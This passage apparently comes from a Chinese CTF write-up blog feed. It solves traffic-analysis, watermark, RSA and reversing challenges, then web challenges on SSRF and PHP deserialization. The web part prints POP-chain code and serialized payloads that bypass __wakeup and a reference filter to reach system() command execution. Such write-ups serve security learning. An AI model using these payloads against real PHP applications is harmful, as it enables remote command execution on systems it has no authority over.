title="packet"></a>packet</h3><p>简单的流量分析</p><p>wireshark打开附件</p><p>找到发的shell.php</p><p><img src="https://bu.dusays.com/2024/05/15/66442085da0db.png" alt="image-20240427104226841"></p><p>跟踪流</p><p><img src="https://bu.dusays.com/2024/05/15/66442085c4990.png" alt="image-20240427104253115"></p><p>base64解码</p><p><img src="https://bu.dusays.com/2024/05/15/66442085c6625.png" alt="image-20240427104354755"></p><p>flag{7d6f17a4-2b0a-467d-8a42-66750368c249}</p><h3 id="消失的数据"><a href="#消失的数据" class="headerlink" title="消失的数据"></a>消失的数据</h3><p>爆破解压包密码：</p><p>pavilion</p><p>发现应该是水印</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pywt</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WaterMarkDWT</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, origin: <span class="built_in">str</span>, watermark: <span class="built_in">str</span>, key: <span class="built_in">int</span>, weight: <span class="built_in">list</span></span>):</span><br><span class="line">        self.key = key</span><br><span class="line">        self.img = cv2.imread(origin)</span><br><span class="line">        self.mark = cv2.imread(watermark)</span><br><span class="line">        self.coef = weight</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">arnold</span>(<span class="params">self, img</span>):</span><br><span class="line">        r, c = img.shape</span><br><span class="line">        p = np.zeros((r, c), np.uint8)</span><br><span class="line"> </span><br><span class="line">        a, b = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(self.key):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c):  </span><br><span class="line">                    x = (i + b * j) % r</span><br><span class="line">                    y = (a * i + (a * b + <span class="number">1</span>) * j) % c</span><br><span class="line">                    p[x, y] = img[i, j]</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">deArnold</span>(<span class="params">self, img</span>):</span><br><span class="line">        r, c = img.shape</span><br><span class="line">        p = np.zeros((r, c), np.uint8)</span><br><span class="line"> </span><br><span class="line">        a, b = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(self.key):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c): </span><br><span class="line">                        x = ((a * b + <span class="number">1</span>) * i - b * j) % r</span><br><span class="line">                        y = (-a * i + j) % c</span><br><span class="line">                        p[x, y] = img[i, j]</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="comment"># 省略了Arnold和deArnold方法的定义</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, size: <span class="built_in">tuple</span> = (<span class="params"><span class="number">1200</span>, <span class="number">1200</span></span>), flag: <span class="built_in">int</span> = <span class="literal">None</span></span>):</span><br><span class="line">        img = cv2.resize(self.img, size)</span><br><span class="line"></span><br><span class="line">        img1 = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY)</span><br><span class="line">        img2 = cv2.cvtColor(self.mark, cv2.COLOR_RGB2GRAY)</span><br><span class="line"></span><br><span class="line">        c = pywt.wavedec2(img2, <span class="string">&#x27;db2&#x27;</span>, level=<span class="number">3</span>)</span><br><span class="line">        [cl, (cH3, cV3, cD3), (cH2, cV2, cD2), (cH1, cV1, cD1)] = c</span><br><span class="line"></span><br><span class="line">        d = pywt.wavedec2(img1, <span class="string">&#x27;db2&#x27;</span>, level=<span class="number">3</span>)</span><br><span class="line">        [dl, (dH3, dV3, dD3), (dH2, dV2, dD2), (dH1, dV1, dD1)] = d</span><br><span class="line"></span><br><span class="line">        a1, a2, a3, a4 = self.coef</span><br><span class="line"></span><br><span class="line">        ca1 = (cl - dl) * a1</span><br><span class="line">        ch1 = (cH3 - dH3) * a2</span><br><span class="line">        cv1 = (cV3 - dV3) * a3</span><br><span class="line">        cd1 = (cD3 - dD3) * a4</span><br><span class="line"></span><br><span class="line">        waterImg = pywt.waverec2([ca1, (ch1, cv1, cd1)], <span class="string">&#x27;db2&#x27;</span>)</span><br><span class="line">        waterImg = np.array(waterImg, np.uint8)</span><br><span class="line"></span><br><span class="line">        waterImg = self.deArnold(waterImg)</span><br><span class="line"></span><br><span class="line">        kernel = np.ones((<span class="number">3</span>, <span class="number">3</span>), np.uint8)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            waterImg = cv2.erode(waterImg, kernel)</span><br><span class="line">        <span class="keyword">elif</span> flag == <span class="number">1</span>:</span><br><span class="line">            waterImg = cv2.dilate(waterImg, kernel)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> waterImg</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    img = <span class="string">&#x27;a.png&#x27;</span></span><br><span class="line">    k = <span class="number">20</span></span><br><span class="line">    xs = [<span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.5</span>, <span class="number">0.4</span>]</span><br><span class="line">    watermark_img = <span class="string">&#x27;newImg.png&#x27;</span></span><br><span class="line">    W1 = WaterMarkDWT(img, watermark_img, k, xs)</span><br><span class="line"></span><br><span class="line">    decrypted_w</span><br><span class="line">    atermark = W1.get()</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;shuiying.png&#x27;</span>, decrypted_watermark)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66442085eafe5.png" alt="image-20240427114530936"></p><p>得解：</p><p> flag{e642820a-44c0-4c7d-a259-68b15aca8840}</p><h2 id="密码破解-crypto"><a href="#密码破解-crypto" class="headerlink" title="密码破解(crypto)"></a>密码破解(crypto)</h2><h3 id="cc"><a href="#cc" class="headerlink" title="cc"></a>cc</h3><p><img src="https://bu.dusays.com/2024/05/15/664420861084c.png" alt="image-20240427104735618"></p><p>对称加密</p><p><img src="https://bu.dusays.com/2024/05/15/6644208640a84.png" alt="image-20240427133002886"></p><p>flag{6500e76e-15fb-42e8-8f29-a309ab73ba38}</p><h3 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line">m =  bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">d1 = d % q</span><br><span class="line">d2 = d % p</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(d1)</span><br><span class="line"><span class="built_in">print</span>(d2)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791</span></span><br><span class="line"><span class="comment"># 4218387668018915625720266396593862419917073471510522718205354605765842130260156168132376152403329034145938741283222306099114824746204800218811277063324566</span></span><br><span class="line"><span class="comment"># 9600627113582853774131075212313403348273644858279673841760714353580493485117716382652419880115319186763984899736188607228846934836782353387850747253170850</span></span><br><span class="line"><span class="comment"># 36423517465893675519815622861961872192784685202298519340922692662559402449554596309518386263035128551037586034375613936036935256444185038640625700728791201299960866688949056632874866621825012134973285965672502404517179243752689740766636653543223559495428281042737266438408338914031484466542505299050233075829</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">n = <span class="number">94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = nextprime(gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> n % p != <span class="number">0</span>:</span><br><span class="line">    p = nextprime(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = n//p</span><br><span class="line">c = <span class="number">36423517465893675519815622861961872192784685202298519340922692662559402449554596309518386263035128551037586034375613936036935256444185038640625700728791201299960866688949056632874866621825012134973285965672502404517179243752689740766636653543223559495428281042737266438408338914031484466542505299050233075829</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># print(gcd(phi,65537))</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>flag{5f00e1b9-2933-42ad-b4e1-069f6aa98e9a}</p><h2 id="逆向分析-re"><a href="#逆向分析-re" class="headerlink" title="逆向分析(re)"></a>逆向分析(re)</h2><h3 id="rc4"><a href="#rc4" class="headerlink" title="rc4"></a>rc4</h3><p>IDA打开</p><p>在main函数return处下断点</p><p><img src="https://bu.dusays.com/2024/05/15/6644208655330.png" alt="image-20240427105408996"></p><p>调试 双击v5查看栈</p><p><img src="https://bu.dusays.com/2024/05/15/6644208602e53.png" alt="image-20240427105440148"></p><p>flag{12601b2b-2f1e-468a-ae43-92391ff76ef3}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-第一届“帕鲁杯”CTF-wp</title>
      <link href="/2024/05/15/2023-%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%B8%95%E9%B2%81%E6%9D%AF%E2%80%9DCTF-wp/"/>
      <url>/2024/05/15/2023-%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%B8%95%E9%B2%81%E6%9D%AF%E2%80%9DCTF-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="第一届“帕鲁杯”-CTF应急响应挑战赛"><a href="#第一届“帕鲁杯”-CTF应急响应挑战赛" class="headerlink" title="第一届“帕鲁杯”-CTF应急响应挑战赛"></a>第一届“帕鲁杯”-CTF应急响应挑战赛</h1><p>应急响应的题根本做不来 还是学web吧 </p><p>以后应该不会学密码、misc之类的了</p><p>现在的学习路线是先学蓝队这边java安全 溯源什么的</p><p>然后大二学红队这边 渗透 内网 re 武器开发之类的</p><h2 id="Web-签到"><a href="#Web-签到" class="headerlink" title="Web-签到"></a>Web-签到</h2><p>进来</p><p><img src="https://bu.dusays.com/2024/05/15/6644200a89bd6.png" alt="image-20240424191939185"></p><p>给了源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag  <span class="comment"># 假设从 flag.py 文件中导入了 flag 函数</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url:</span><br><span class="line">        <span class="comment"># 请求url</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        content = response.text</span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;paluctf&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> content</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        response = &#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="number">200</span>,  <span class="comment"># 这里是数值，不是字符串</span></span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: <span class="string">&quot;Come sign in and get the flag!&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jsonify(response)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag1</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;paluctf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码是一个使用 Flask 框架的 Python Web 应用。它定义了两个路由，一个是根路径 <code>/</code>，另一个是 <code>/flag</code>。以下是代码的详细解释：</p><ol><li>导入模块和函数:<ul><li><code>Flask</code>: Flask web 框架的核心。</li><li><code>request</code>: 用于处理客户端请求数据的对象。</li><li><code>jsonify</code>: 用于将字典转换为 JSON 格式响应。</li><li><code>requests</code>: 用于发送 HTTP 请求的库。</li><li><code>flag</code>: 从 <code>flag.py</code> 文件中导入的函数或变量（代码中未给出 <code>flag.py</code> 的内容，所以我们不知道 <code>flag</code> 的具体内容和类型）。</li></ul></li><li>初始化 Flask 应用:<ul><li><code>app = Flask(__name__)</code>: 创建一个 Flask web 应用实例。</li></ul></li><li>定义路由和对应的处理函数:<ul><li>根路径 <code>/</code>:<ul><li><code>url = request.args.get(&#39;url&#39;)</code>: 从 GET 请求的参数中获取 <code>url</code>。</li><li>如果url存在：<ul><li>使用 <code>requests.get(url)</code> 发送 GET 请求到这个 <code>url</code>。</li><li>获取响应的文本内容，并打印它。</li><li>检查响应内容中是否包含 “paluctf”。<ul><li>如果包含，返回 <code>flag</code>。</li><li>否则，返回响应的文本内容。</li></ul></li></ul></li><li>如果url不存在：<ul><li>返回一个 JSON 格式的响应，包含消息和提示数据。</li></ul></li></ul></li><li>&#x2F;flag 路由:<ul><li>无论使用 GET 还是 POST 请求，都直接返回字符串 “paluctf”。</li></ul></li></ul></li><li>运行 Flask 应用:<ul><li><code>if __name__ == &#39;__main__&#39;:</code>: 确保只有在直接运行这个脚本时，下面的代码才会执行。</li><li><code>app.run(debug=True, host=&quot;0.0.0.0&quot;, port=80)</code>: 在 debug 模式下运行 Flask 应用，监听所有可用的 IP 地址（<code>0.0.0.0</code>），并使用默认的 HTTP 端口 80。</li></ul></li></ol><p>注意：</p><ul><li>在生产环境中，通常不会使用 <code>debug=True</code> 和端口 80（因为端口 80 通常需要管理员权限），并且应该使用更安全的配置和措施。</li><li>如果 <code>flag</code> 是一个函数，那么 <code>return flag</code> 实际上会返回函数的引用，而不是函数的执行结果。如果 <code>flag</code> 应该是一个值或字符串，那么你可能需要确保从 <code>flag.py</code> 中正确导入。</li><li>代码中的 <code>print(content)</code> 在生产环境中可能不是最佳实践，因为它会在控制台打印响应内容，这可能会导致敏感信息的泄露。</li></ul><p>总之，这段代码是一个简单的 Flask 应用，用于接收一个 URL 作为输入，获取该 URL 的内容，并基于内容中是否包含 “paluctf” 来返回不同的响应。此外，它还提供了一个 <code>/flag</code> 路由，直接返回 “paluctf” 字符串。</p><p>访问路由flag：</p><p><img src="https://bu.dusays.com/2024/05/15/6644200a367d6.png" alt="image-20240424195219369"></p><p>所以存在一个ssrf</p><p>根据源码 随便提交一个url就行 还是要访问flag路由</p><p><img src="https://bu.dusays.com/2024/05/15/6644200b2be9a.png" alt="image-20240424195628975"></p><h2 id="R23"><a href="#R23" class="headerlink" title="R23"></a>R23</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/R:2|R:3/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>反序列化</p><p>明显要绕过<code>__wekeup</code> 最后执行在system </p><p>所以：xk–&gt;a–&gt;b</p><p>先把链子写出来 这里的类中没有属性 我们自己随便编一下属性就行：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="comment">//    public function __get($a)&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;b-&gt;love();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line"><span class="comment">//    public function __destruct()&#123;</span></span><br><span class="line"><span class="comment">//        $tmp = $this-&gt;c-&gt;name;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    public function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;c = &quot;no!&quot;;</span></span><br><span class="line"><span class="comment">//        $this-&gt;b = $this-&gt;a;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line"><span class="comment">//    public function love()&#123;</span></span><br><span class="line"><span class="comment">//        system($_GET[&#x27;a&#x27;]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if(preg_match(&#x27;/R:2|R:3/&#x27;,$_GET[&#x27;pop&#x27;]))&#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;no&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$xk</span>=<span class="keyword">new</span> <span class="title function_ invoke__">xk</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;b=<span class="variable">$xk</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;c=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;b&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;a&quot;:1:&#123;s:1:&quot;b&quot;;O:2:&quot;xk&quot;:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>再绕过一下__wekeup</p><blockquote><p>序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过__wakeup()的执行</p></blockquote><p>所以：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;b&quot;:2:&#123;s:1:&quot;c&quot;;O:1:&quot;a&quot;:1:&#123;s:1:&quot;b&quot;;O:2:&quot;xk&quot;:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是这里：</p><p>还有一个绕过：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/R:2|R:3/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接用改属性个数无法绕过 我这里直接没有回显</p><p>过滤了R？ 没见过</p><p>我们需要知道R是怎么来的–&gt;看反序列化的笔记，这里就不赘述了</p><h3 id="法1："><a href="#法1：" class="headerlink" title="法1："></a>法1：</h3><p>根据r与R的来源 </p><p>这里又禁用了R后的数字2 3</p><p>那么我们自然想到让R后面不是2或3就行</p><p>问下AI：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">outObject</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> h;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">innerObject</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[a]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> outObject;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> innerObject;</span><br><span class="line"><span class="variable">$a</span>-&gt;h=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>当然不是对这题来说，放到这题，思路就是我们本来要传的是对象b的序列化字符串，但是如果让b成为另一个类的属性，就会改变R后面的值。由于这里只有三个类，我们不能自己给它加一个类啊，这里我想到了php的原生类，可以直接用的那种，AI说：stdClass：一个空类，没有定义任何方法或属性。于是得到下面的poc：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public function __get($a)&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;b-&gt;love();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line"><span class="comment">//    public function __destruct()&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        $tmp = $this-&gt;c-&gt;name;</span></span><br><span class="line"><span class="comment">//        echo(&#x27;bye&#x27;);</span></span><br><span class="line"><span class="comment">//        var_dump($this-&gt;c);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    public function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">////</span></span><br><span class="line"><span class="comment">//        $this-&gt;c = &quot;no!&quot;;</span></span><br><span class="line"><span class="comment">//        $this-&gt;b = $this-&gt;a;</span></span><br><span class="line"><span class="comment">//        //var_dump($this-&gt;a);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line"><span class="comment">//    public function love()&#123;</span></span><br><span class="line"><span class="comment">//        echo(&#x27;hi&#x27;);</span></span><br><span class="line"><span class="comment">//        system($_GET[&#x27;a&#x27;]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$outerObj</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line"><span class="variable">$p</span>=<span class="keyword">new</span> a;</span><br><span class="line"><span class="variable">$q</span>=<span class="keyword">new</span> b;</span><br><span class="line"><span class="variable">$p</span>-&gt;b=<span class="keyword">new</span> xk;</span><br><span class="line"><span class="variable">$q</span>-&gt;b=&amp;<span class="variable">$q</span>-&gt;c;</span><br><span class="line"><span class="variable">$q</span>-&gt;a=<span class="variable">$p</span>;</span><br><span class="line"><span class="variable">$q</span>-&gt;c=<span class="variable">$p</span>;</span><br><span class="line"><span class="comment">/** <span class="doctag">@var</span> TYPE_NAME $out */</span></span><br><span class="line"><span class="variable">$out</span>-&gt;innerObject[<span class="number">0</span>]=<span class="variable">$q</span>;<span class="comment">//如果是innerObject=$q;打印出来R后面是3，把它变成数组第一个元素的话R后面就是4</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$out</span>)));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A11%3A%22innerObject%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A1%3A%22b%22%3A3%3A%7Bs%3A1%3A%22c%22%3BO%3A1%3A%22a%22%3A1%3A%7Bs%3A1%3A%22b%22%3BO%3A2%3A%22xk%22%3A0%3A%7B%7D%7Ds%3A1%3A%22b%22%3BR%3A4%3Bs%3A1%3A%22a%22%3Br%3A4%3B%7D%7D%7D</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/6644200a554db.png" alt="image-20240424225825627"></p><p>再cat flag.php 就行</p><p>源码中找到flag</p><p><img src="https://bu.dusays.com/2024/05/15/6644200a38035.png" alt="image-20240424225946495"></p><h3 id="法2："><a href="#法2：" class="headerlink" title="法2："></a>法2：</h3><p>既然不能用改属性个数的方法来绕过 我们就需要一个新方法</p><p>利用点为<code>$this-&gt;b = $this-&gt;a;</code>所以我们可以引用赋值绕过__wakeup()<br>注：<code>$b-&gt;b = &amp;$b-&gt;c; </code>意味着它们引用相同的内存地址，它们指向相同的值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="comment">//    public $b;</span></span><br><span class="line"><span class="comment">//    public function __get($a)&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;b-&gt;love();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line"><span class="comment">//    public $a;</span></span><br><span class="line"><span class="comment">//    public 